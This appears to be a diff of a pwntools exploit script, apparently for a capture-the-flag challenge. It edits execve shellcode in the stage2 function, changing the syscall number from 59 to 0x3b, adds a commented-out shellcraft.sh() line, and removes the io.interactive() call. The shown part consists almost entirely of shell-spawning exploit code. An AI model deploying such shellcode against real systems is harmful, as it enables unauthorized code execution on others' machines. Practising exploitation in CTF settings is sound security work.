@@ -33,11 +33,11 @@ def stage2():
         push rdi
         push rsp
         pop rdi
-        mov al, 59
+        mov al, 0x3b
         cdq
         syscall
     """)
-
+    # sc = asm(shellcraft.sh())
     io.send(sc)
 
 def solve(r=False):
@@ -71,8 +71,6 @@ def main():
                 break
         except EOFError:
             pass
-
-    io.interactive()
 
 def aslr_off():
     global io
